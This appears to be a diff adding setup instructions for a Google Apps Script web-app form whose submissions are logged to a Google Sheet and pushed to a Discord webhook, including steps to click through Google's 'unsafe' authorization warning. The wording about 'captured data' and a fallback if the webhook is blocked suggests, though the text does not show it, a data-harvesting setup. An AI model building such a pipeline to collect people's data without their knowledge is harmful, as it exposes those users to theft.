@@ -1,0 +1,58 @@
+Path 1: Google Sheet (Static Storage)
+The sheet acts as the primary database. If the webhook is blocked or rate-limited, the sheet retains the data.
+
+Open Google Drive. Create a new, blank Google Sheet. Name it whatever you want (e.g., Logs).
+
+Look at the browser URL. It will look like this:
+https://docs.google.com/spreadsheets/d/1aBcDeFgHiJkLmNoPqRsTuVwXyZ1234567890/edit
+
+Extract the string between /d/ and /edit. In the example above, the ID is 1aBcDeFgHiJkLmNoPqRsTuVwXyZ1234567890.
+
+Open your Code.gs in Google Apps Script. Find this line:
+var sheetId = "YOUR_GOOGLE_SHEET_ID_HERE";
+
+Replace the placeholder with your ID:
+var sheetId = "1aBcDeFgHiJkLmNoPqRsTuVwXyZ1234567890";
+
+Path 2: Discord Webhook (Real-Time Push)
+The webhook pushes the captured data directly to your phone or desktop in real-time.
+
+Open Discord. Create a private server (or use an existing one you control).
+
+Go to Server Settings -> Integrations -> Webhooks.
+
+Click New Webhook. Select the channel you want the data to drop into.
+
+Click Copy Webhook URL. It will look like:
+https://discord.com/api/webhooks/123456789012345678/AbCdEfGhIjKlMnOpQrStUvWxYz
+
+Open your Code.gs. Find this line:
+var webhookUrl = "YOUR_DISCORD_WEBHOOK_URL_HERE";
+
+Replace the placeholder with your URL:
+var webhookUrl = "https://discord.com/api/webhooks/123456789012345678/AbCdEfGhIjKlMnOpQrStUvWxYz";
+
+Execution and Scope Authorization
+Once both strings are replaced in Code.gs, save the file (Ctrl + S).
+
+The critical step:
+You must trigger the authorization flow before the script will work.
+
+In the Apps Script editor, look at the top toolbar. Select processForm from the dropdown menu next to the "Debug" (bug icon) button.
+
+Click Run.
+
+Google will prompt: "Authorization required. This project requires your permission to access data."
+
+Click Review Permissions, choose your account, click Advanced, and click Go to [Project Name] (unsafe).
+
+Google will ask for permission to:
+
+See, edit, create, and delete all your Google Sheets spreadsheets (for the Sheet ID).
+
+Connect to an external service (for the Discord webhook).
+
+Click Allow.
+
+The connections are now live. When the Index.html form is submitted via the deployed Web App, data flows to both points simultaneously.
+
